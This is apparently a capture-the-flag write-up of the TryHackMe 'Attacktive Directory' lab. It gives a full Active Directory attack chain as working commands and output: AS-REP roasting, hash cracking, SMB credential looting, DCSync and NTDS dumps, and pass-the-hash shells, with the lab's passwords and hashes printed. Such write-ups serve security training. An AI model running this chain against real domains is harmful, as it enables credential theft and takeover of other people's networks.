---
layout: post
title: Attacktive Directory - TryHackMe
tags: [THM, AD, Windows]
description: "Attacktive Directory - TryHackMe"
---

# Vulnerable System: 10.10.28.119

- [Enumeration](#enumeration)
- [Foothold](#foothoold)
- [Getting reverse shell](#getting-reverse-shell)
- [Privilege Escalation](#privilege-escalation)

![logo](/assets/imgs/attacktive-directory/logo.png)

99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?.

[Attack Directory](https://tryhackme.com/room/attacktivedirectory) it is a room of the TryHackMe platform and it is what we will use to practice a little about the active directory

-----

### Install impacket
Impacket es una colección de clases de Python para trabajar con protocolos de red.

Impacket se centra en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, **SMB1-3** y **MSRPC**).

> git clone [https://github.com/SecureAuthCorp/impacket.git /opt/impacket](https://github.com/SecureAuthCorp/impacket.git /opt/impacket)
> sudo pip3 install -r /opt/impacket/requirements.txt
> cd /opt/impacket/
> sudo pip3 install .
> sudo python3 setup.py install

## Enumeration:
### Nmap

To know only the open ports, the following command was used: ```sudo nmap -p- --open -sS -Pn -n --min-rate 5000 <IP>```

Once these ports were obtained, they were analyzed in greater depth.

| Parameter | Description                                  |
| --------- | -------------------------------------------- |
| -p        | only specified ports                         |
| -sC       | basic enumeration scripts                    |
| -Pn       | skip host discovery                          |
| -sV       | determine port version / service information |
| -oN       | output scan                                  |

> For more information ```man nmap```.

```
# Nmap 7.91 scan initiated Tue Aug 10 00:06:14 2021 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49669,49674,49675,49676,49679,49685,49695 -sC -sV -Pn -oN targeted 10.10.28.119
Nmap scan report for 10.10.28.119
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-10 05:06:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-10T05:07:22+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-08-09T05:04:14
|_Not valid after:  2022-02-08T05:04:14
|_ssl-date: 2021-08-10T05:07:29+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-08-10T05:07:22
|_  start_date: N/A
```

Interesting services found:

* 88 (kerberos) Microsoft Windows Kerberos
* 139 (netbios-ssn) Microsoft Windows netbios-ssn
* 389,3268 (ldap) Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)

-----

### Enumeratio service samba

## Enumerating Users via Kerberos
smbclient — ftp-like client to access SMB/CIFS resources on servers

| argument | description |
| -------- | ----------- |
| -L       | list shares |
| -N       | null sesion |

```
❯ smbclient -L \\10.10.28.119 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

#### rpcclient null
rpcclient - tool for executing client side  MS-RPC functions

| argument | description |
| -------- | ----------- |
| -U       | user        |
| -N       | null pass   |

```
❯ rpcclient -U "" 10.10.28.119 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```
## AS-REP roasting
ASReproasting occurs when a user account has the **No prior authentication required** privilege set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

### Enumerating users via kerberos
In this section, a [list of users](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and a list of modified [passwords](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to reduce the time of user enumeration and password hashing decryption. Using brute force credentials is NOT recommended due to account lockout policies that we cannot enumerate on the domain controller.

Impacket has a tool called **GetNPUsers.py** (located at impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center.

```
❯ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt | grep -v "SessionError"
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e8727870e0a5716559eee4785$56dab197a6006af987bc542101c4b04c9d01debef4c90735042ff072a4aa25138261f84cdbf502b456a738ed3c84d069c7956ff20d2fbca7ac31662e70e7f5513c3589b00eb26dbe9f125e91c9f125b45dbeea8020e85c3ef9a3e2414589627aa3fa961a61706e3089ca642f2eacefd4416ed7f4ac0306aa0726fc5c4b65ac064918e13590a2d62ed4b25d4bb5a2cf50f72f913b3859736bf7655e142c5c1e80c664782ba93de750ca3750a5e2aeb6a0393dc0229a57f771e35a5665aeb2309c65f4be2f17b9c9b33a851ff347ea18c78ceb97ffe9f7882c4d30d81616350f37832e0c0659ae595e4b0554b9ddb2d6d19924
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
```

### Cracking hash
#### hashcat

Searching for the type of hash found.

```
❯ hashcat --example-hashes | grep "\$krb5asrep" -B 2
MODE: 18200
TYPE: Kerberos 5, etype 23, AS-REP
HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
```

#### Cracking

```
❯ hashcat -m 18200 -a 0 hash passwordlist.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9700 CPU @ 3.00GHz, 3933/3997 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 99 MB

Dictionary cache hit:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e8727870e0a5716559eee4785$56dab197a6006af987bc542101c4b04c9d01debef4c90735042ff072a4aa25138261f84cdbf502b456a738ed3c84d069c7956ff20d2fbca7ac31662e70e7f5513c3589b00eb26dbe9f125e91c9f125b45dbeea8020e85c3ef9a3e2414589627aa3fa961a61706e3089ca642f2eacefd4416ed7f4ac0306aa0726fc5c4b65ac064918e13590a2d62ed4b25d4bb5a2cf50f72f913b3859736bf7655e142c5c1e80c664782ba93de750ca3750a5e2aeb6a0393dc0229a57f771e35a5665aeb2309c65f4be2f17b9c9b33a851ff347ea18c78ceb97ffe9f7882c4d30d81616350f37832e0c0659ae595e4b0554b9ddb2d6d19924:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e872...d19924
Time.Started.....: Tue Aug 10 00:48:01 2021 (0 secs)
Time.Estimated...: Tue Aug 10 00:48:01 2021 (0 secs)
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1278.9 kH/s (11.43ms) @ Accel:128 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/70188 (23.34%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: m123456 -> cowgirlup

Started: Tue Aug 10 00:48:00 2021
Stopped: Tue Aug 10 00:48:03 2021

❯ hashcat -m 18200 -a 0 hash --show
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e8727870e0a5716559eee4785$56dab197a6006af987bc542101c4b04c9d01debef4c90735042ff072a4aa25138261f84cdbf502b456a738ed3c84d069c7956ff20d2fbca7ac31662e70e7f5513c3589b00eb26dbe9f125e91c9f125b45dbeea8020e85c3ef9a3e2414589627aa3fa961a61706e3089ca642f2eacefd4416ed7f4ac0306aa0726fc5c4b65ac064918e13590a2d62ed4b25d4bb5a2cf50f72f913b3859736bf7655e142c5c1e80c664782ba93de750ca3750a5e2aeb6a0393dc0229a57f771e35a5665aeb2309c65f4be2f17b9c9b33a851ff347ea18c78ceb97ffe9f7882c4d30d81616350f37832e0c0659ae595e4b0554b9ddb2d6d19924:management2005

```

### Joh The Ripper

```
❯ john hash --wordlist=passwordlist.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2021-08-10 00:48) 50.00g/s 332800p/s 332800c/s 332800C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed

❯ john --show hash
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:management2005

1 password hash cracked, 0 left
```

-----

#### Validation of credentials user svc-admin

```
❯ crackmapexec smb spookysec.local -u "svc-admin" -p "management2005"
SMB         10.10.28.119    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.28.119    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
```

#### Shares for user svc-admin

```
❯ smbclient -L \\10.10.28.119 -U "svc-admin%management2005"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

##### SMB mount

```
❯ sudo mkdir /mnt/samba
[sudo] password for noroot:
❯ sudo mount -t cifs //10.10.28.119/backup /mnt/samba -o username=svc-admin,password=management2005,rw
❯ ls -l /mnt/samba
.rwxr-xr-x root root 48 B Sat Apr  4 14:08:53 2020  backup_credentials.txt
```

We found another user

```
❯ cat /mnt/samba/backup_credentials.txt
───────┬────────────────────────────────────────────────────────────────────
       │ File: /mnt/samba/backup_credentials.txt
───────┼────────────────────────────────────────────────────────────────────
   1   │ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
───────┴────────────────────────────────────────────────────────────────────

❯ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"|base64 -d; echo
backup@spookysec.local:backup2517860
```

#### Validation of credentials user backup

```
❯ crackmapexec smb spookysec.local -u "backup" -p "backup2517860"
SMB         10.10.28.119    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.28.119    445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
```

-----

### Enumeration via rpcclient

```
❯ rpcclient 10.10.28.119 -U "backup"
Enter WORKGROUP\backup's password:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[skidy] rid:[0x44f]
user:[breakerofthings] rid:[0x450]
user:[james] rid:[0x451]
user:[optional] rid:[0x452]
user:[sherlocksec] rid:[0x453]
user:[darkstar] rid:[0x454]
user:[Ori] rid:[0x455]
user:[robin] rid:[0x456]
user:[paradox] rid:[0x457]
user:[Muirland] rid:[0x458]
user:[horshark] rid:[0x459]
user:[svc-admin] rid:[0x45a]
user:[backup] rid:[0x45e]
user:[a-spooks] rid:[0x641]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[dc] rid:[0x45d]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
        rid:[0x641] attr:[0x7]

rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 17 set 2020 18:03:37 -05
        Logoff Time              :      mié, 31 dic 1969 19:00:00 -05
        Kickoff Time             :      mié, 31 dic 1969 19:00:00 -05
        Password last set Time   :      jue, 17 set 2020 17:53:29 -05
        Password can change Time :      vie, 18 set 2020 17:53:29 -05
        Password must change Time:      mié, 13 set 30828 21:48:05 -05
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000f
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> queryuser 0x641
        User Name   :   a-spooks
        Full Name   :   Admin Spooks
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 17 set 2020 19:07:50 -05
        Logoff Time              :      mié, 31 dic 1969 19:00:00 -05
        Kickoff Time             :      mié, 13 set 30828 21:48:05 -05
        Password last set Time   :      jue, 17 set 2020 18:02:20 -05
        Password can change Time :      vie, 18 set 2020 18:02:20 -05
        Password must change Time:      mié, 13 set 30828 21:48:05 -05
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000006
        padding1[0..7]...
        logon_hrs[0..21]...
```

> enumdomusers

> enumdomgroups

> querygroupmem

------

## DCSync Attack

```
❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/svc-admin:management2005@10.10.28.119
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

```
❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.28.119
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:88dbcf1ea5935c4939535b559a31c6bb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:9f0654d0c1bf2848a6479d49ec676e28fadb5de619bdeeb7c3862cfbf9fad8a0
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:fa747d1de3b37d54d18dd13370ad252c
ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
[*] Cleaning up...
```


#### Validation user a-spooks

```
❯ crackmapexec smb spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc"
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] spookysec.local\a-spooks 0e0363213e37b94221497260b0bcb4fc (Pwn3d!)

```

-----

## Evil-winrm
Evil-winrm installation.

> gem install evil-winrm

```
❯ evil-winrm -i spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc"

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-spooks\Documents> whoami
thm-ad\a-spooks
*Evil-WinRM* PS C:\Users\a-spooks\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::9848:5521:ee29:34c%6
   IPv4 Address. . . . . . . . . . . : 10.10.28.119
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

### crackmapexec ntds

```
❯ crackmapexec smb spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc" --ntds vss
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] spookysec.local\a-spooks 0e0363213e37b94221497260b0bcb4fc (Pwn3d!)
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.28.119   445    ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:88dbcf1ea5935c4939535b559a31c6bb:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
